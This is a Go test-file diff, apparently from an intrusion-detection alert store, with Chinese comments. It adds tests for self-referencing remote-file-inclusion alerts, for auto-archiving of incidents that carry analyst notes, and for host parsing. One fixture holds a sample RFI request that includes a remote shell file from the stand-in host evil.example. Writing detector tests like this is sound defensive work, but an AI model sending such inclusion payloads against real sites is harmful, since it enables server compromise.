@@ -216,3 +216,54 @@ func TestOutboundOnlyFromConnections(t *testing.T) {
 		t.Fatalf("防火墙记录的出站连接才是外部目标: %q", res.NewOutbound)
 	}
 }
+
+// 指向请求 Host 的“远程文件包含”：Host 是有正常访问的真实站点时丢弃；Host 是攻击者随意填写的域名时照常告警。
+func TestSelfRefRFI(t *testing.T) {
+	s := newTestStore()
+	now := time.Now().Add(-time.Hour)
+	for i := 0; i < 6; i++ { // app.example.com 的首页有稳定的正常访问
+		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.10", Host: "app.example.com", Method: "GET", URI: "/", Status: 200, Bytes: 5000, Time: now.Add(time.Duration(i) * time.Second)}, nil)
+	}
+	rfi := hit("rfi", "远程文件包含", model.PhaseExploit, model.SevHigh, model.ResultSuccess)
+	rfi.SelfRef = true
+	res := s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "45.3.6.1", Host: "app.example.com", Method: "GET", URI: "/viewer.html?file=https://app.example.com/a.pdf", Status: 200, Time: now.Add(time.Minute)}, []model.Hit{rfi})
+	if len(res.Alerts) != 0 {
+		t.Fatalf("真实站点上指向本站的地址不应告警: %+v", res.Alerts)
+	}
+	res = s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "45.3.6.2", Host: "evil.example", Method: "GET", URI: "/index.php?page=http://evil.example/shell.txt", Status: 200, Time: now.Add(time.Minute)}, []model.Hit{rfi})
+	if len(res.Alerts) != 1 {
+		t.Fatalf("Host 被改成攻击者的域名时应照常告警: %+v", res.Alerts)
+	}
+}
+
+// 用户名以 AI 开头的分析员写过备注的事件不被自动归档（模型备注的作者固定写作“AI（模型名）”）。
+func TestAutoArchiveKeepsAIPrefixedUserNote(t *testing.T) {
+	s := newTestStore()
+	old := time.Now().Add(-4 * 24 * time.Hour)
+	recon := hit("bhv-dirscan", "目录扫描", model.PhaseRecon, model.SevMedium, model.ResultFailed)
+	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "45.3.7.1", Host: "a.example.com", Method: "GET", URI: "/a", Status: 404, Time: old}, []model.Hit{recon})
+	s.mu.RLock()
+	id := s.incByKey["45.3.7.1"]
+	s.mu.RUnlock()
+	if _, err := s.UpdateIncidents([]uint64{id}, "AIden", IncidentUpdate{Note: "在看，先别关"}); err != nil {
+		t.Fatal(err)
+	}
+	if list := s.AutoArchive(time.Now(), 72*time.Hour); len(list) != 0 {
+		t.Fatalf("分析员写过备注的事件不应被自动归档: %+v", list)
+	}
+}
+
+// 目标中的主机：IPv6 地址不在第一个冒号处截断；Host 换成 OAST 子域名的请求与真实站点用同一个“虚构站点”键。
+func TestTargetHostAndSiteKey(t *testing.T) {
+	for in, want := range map[string]string{
+		"2408:8000:1::10:22/tcp": "2408:8000:1::10", "2408:8000:ffff::99:443/tcp": "2408:8000:ffff::99", "10.0.0.5:22/tcp": "10.0.0.5",
+		"www.example.com /a?b=1": "www.example.com", "[2001:db8::1]:8443/tcp": "2001:db8::1", "10.0.0.5/icmp": "10.0.0.5",
+	} {
+		if got := targetHost(in); got != want {
+			t.Errorf("targetHost(%q) = %q，应为 %q", in, got, want)
+		}
+	}
+	if siteHost("") != "-" || siteHost("www.example.com") != "www.example.com" {
+		t.Fatal("站点键")
+	}
+}
